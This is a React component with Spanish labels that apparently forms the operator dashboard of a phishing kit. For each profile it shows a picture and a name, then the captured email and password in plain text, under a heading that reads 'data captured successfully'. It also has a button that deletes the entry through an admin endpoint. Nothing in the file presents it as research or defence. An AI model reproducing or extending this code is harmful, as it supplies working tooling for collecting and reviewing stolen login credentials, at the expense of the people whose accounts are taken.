import React, { Fragment, useEffect } from 'react';
import Title from '../../components/title';
import style from './style.css';
import api from '../../../api.js';
import useProfile from '../../../hocks/profile/data.js';
import { Link } from 'react-router-dom';
import clipboard from 'clipboard';


function Profile (props) {

  const id = props.match.params.id;
  const [view, data] = useProfile(id);

  const deleteProfile = async () => {
    const id = data.id;
    const response = await api({
      method: 'delete',
      url: '/admin/delete',
      data: { id }
    });

    if (!response.error){
      props.history.replace('/admin');
    }
  }

  return (
    <section className={style.body}>
      {(view === 'waiting' || view === 'success') && (
        <div className={style.box} style={data.status ? {borderColor: 'green'} : {borderColor: 'orange'}}>
          {!data.status && (<h1 className={style.state} style={{color: 'orange'}} >Esperando...</h1>)}
          {data.status && (<h1 className={style.state} style={{color: 'green'}} >Datos capturados exitosamente</h1>)}
          <div className={style.flex_profile}>
            <img className={style.picture} src={data.pictures[0]} />
            <div className={style.data_content}>
              <h2 className={style.name}>{data.name}</h2>
              <div className={style.row_data}>
                <div className={style.description}>
                  Correo:
                </div>
                <div className={style.result}>
                  {data.mail || 'esperando...'}
                </div>
              </div>
              <div className={style.row_data}>
                <div className={style.description}>
                  Contraseña:
                </div>
                <div className={style.result}>
                  {data.password || 'esperando...'}
                </div>
              </div>
            </div>
          </div>
          <div className={style.button_container}>
            <div className={style.buttons} onClick={deleteProfile}>
              Eliminar
            </div>
            <Link className={style.buttons} to={`/profile/${data.id}`} >
              ver perfil
            </Link>

          </div>
        </div>
      )}
      {view === 'loading' && (
        <img src="public/assets/preloader.gif" />
      )}
    </section>
  )
}

export default Profile;
